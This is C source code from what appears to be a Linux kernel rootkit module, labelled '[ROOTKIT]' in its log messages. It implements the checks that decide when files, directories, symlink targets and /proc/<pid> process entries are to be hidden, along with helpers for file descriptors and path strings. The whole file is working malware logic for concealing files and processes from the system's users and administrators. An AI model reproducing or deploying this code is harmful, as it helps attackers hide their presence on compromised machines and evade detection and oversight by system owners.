#include "files.h"

#include "macro_utils.h"
#include <asm-generic/errno-base.h>
#include <asm/current.h>
#include <linux/dcache.h>
#include <linux/err.h>
#include <linux/fcntl.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <linux/gfp.h>
#include <linux/kstrtox.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/spinlock.h>
#include <linux/string.h>
#include <linux/types.h>

bool is_process_path(const path_t *const p_path, const char **const ps_name, pid_t *p_pid)
{
    int i_res                = 0;    // Result of `kstrtoint()` (0 on success)
    const dentry_t *p_parent = NULL; // Parent dentry structure
    pid_t i32_pid            = -1;   // PID of the process found in the path, if any

    IF_U (!is_path_proc_descendant(p_path)) {
        if (ps_name != NULL) {
            *ps_name = NULL;
        }
        if (p_pid != NULL) {
            *p_pid = -1;
        }
        return false;
    }

    p_parent = p_path->dentry;

    // Go up the directory tree until we reach a direct child of the root
    while (!IS_ROOT(p_parent->d_parent)) {
        p_parent = p_parent->d_parent;
    }

    // Check if the parent directory is /proc/<pid>, with <pid> being a number
    i_res = kstrtoint(p_parent->d_name.name, 10, &i32_pid);

    if (ps_name != NULL) {
        // Set ps_name to the name of the first directory in the path after its root
        *ps_name = p_parent->d_name.name;
    }

    if (p_pid != NULL) {
        // Set p_pid to the corresponding PID, if this is a process file
        *p_pid = i_res ? -1 : i32_pid;
    }

    return i_res == 0;
}

bool is_path_hidden(const path_t *const p_path)
{
    const dentry_t *p_parent = NULL; // dentry structure for parent directories
    pid_t i32_found_pid      = -1;   // PID of the process found in the path, if any

    IF_U (p_path == NULL) {
        return false;
    }

    IF_U (is_process_path(p_path, NULL, &i32_found_pid)) {
        pr_info("[ROOTKIT] * This is a process file/dir (PID: %d)\n", i32_found_pid);

        // If the path is a process file/dir, check if the process is hidden
        return is_pid_hidden(i32_found_pid);
    }
    else {
        pr_info("[ROOTKIT] * This is not a process file/dir\n");
    }

    IF_U (is_filename_or_pid_hidden(p_path->dentry->d_name.name,
                                    is_path_parent_proc_root(p_path))) {
        return true;
    }

    // If the path is not a process file/dir, check if one of its parents has a hidden name
    p_parent = p_path->dentry->d_parent;
    while (!IS_ROOT(p_parent)) {
        if (is_filename_hidden(p_parent->d_name.name)) {
            pr_info("[ROOTKIT] * Parent directory is hidden: %s\n", p_parent->d_name.name);
            return true;
        }

        p_parent = p_parent->d_parent;
    }

    return false;
}

bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
                        unsigned int ui32_lookup_flags)
{
    bool b_ret               = false; // Return value
    int i_err                = 0;     // Error code
    const char *s_pathname_k = NULL;  // Kernel buffer for path name
    path_t path;                      // Path structure

    ui32_lookup_flags &= ~LOOKUP_AUTOMOUNT; // Do not auto mount

    // First, check without following symlinks
    i_err = user_path_at(i32_dfd, s_pathname, ui32_lookup_flags & ~LOOKUP_FOLLOW, &path);

    IF_U (i_err != 0) {
        s_pathname_k = strndup_user(s_pathname, PATH_MAX);
        pr_err("[ROOTKIT]   * Could not get path for %s (error: %d) (not following symlinks)\n",
               s_pathname_k, i_err);
        kfree_const(s_pathname_k);
        return false;
    }

    b_ret = is_path_hidden(&path);

    // Free the path structure
    path_put(&path);

    if (b_ret || !(ui32_lookup_flags & LOOKUP_FOLLOW)) {
        // Stop if we already know the path is hidden, or if we don't want to follow symlinks
        return b_ret;
    }

    // Check again, this time following symlinks
    i_err = user_path_at(i32_dfd, s_pathname, ui32_lookup_flags, &path);

    IF_U (i_err != 0) {
        s_pathname_k = strndup_user(s_pathname, PATH_MAX);
        pr_err("[ROOTKIT]   * Could not get path for %s (error: %d) (following symlinks)\n",
               s_pathname_k, i_err);
        kfree_const(s_pathname_k);
        return false;
    }

    b_ret = is_path_hidden(&path);

    path_put(&path);

    return b_ret;
}

const file_t *fd_get_file(const int i32_fd)
{
    const file_t *p_file = NULL;           // File structure
    files_t *p_files     = current->files; // Reference to the current task files

    IF_U (p_files == NULL) {
        // If the current task has no files, return an error (this should not happen)
        return ERR_PTR(-ENOENT);
    }

    IF_U (i32_fd < 0) {
        // If the file descriptor is invalid, return an error
        return ERR_PTR(-EBADF);
    }

    spin_lock(&p_files->file_lock); // Lock the files structure while we use it
    p_file = lookup_fd_rcu(i32_fd);
    spin_unlock(&p_files->file_lock);

    IF_U (p_file == NULL) {
        return ERR_PTR(-ENOENT);
    }

    return p_file;
}

const char *path_get_pathname(const path_t *const p_path)
{
    const char *s_pathname     = NULL; // Pathname of the file
    const char *s_pathname_ret = NULL; // Pathname of the file (return value)
    char *p_tmp                = NULL; // Temporary buffer for `d_path()`

    IF_U (p_path == NULL) {
        return ERR_PTR(-EINVAL);
    }

    path_get(p_path); // Increment the path reference count while we use it

    // Allocate a page of memory since PATH_MAX == PAGE_SIZE
    p_tmp = (char *)__get_free_page(GFP_KERNEL);

    IF_U (p_tmp == NULL) {
        path_put(p_path); // Release the path structure
        return ERR_PTR(-ENOMEM);
    }

    s_pathname = d_path(p_path, p_tmp, PAGE_SIZE);
    path_put(p_path);

    IF_U (IS_ERR(s_pathname)) {
        free_page((unsigned long)p_tmp);
        return s_pathname;
    }

    s_pathname_ret = kstrdup_const(s_pathname, GFP_KERNEL);

    free_page((unsigned long)p_tmp);
    return s_pathname_ret;
}
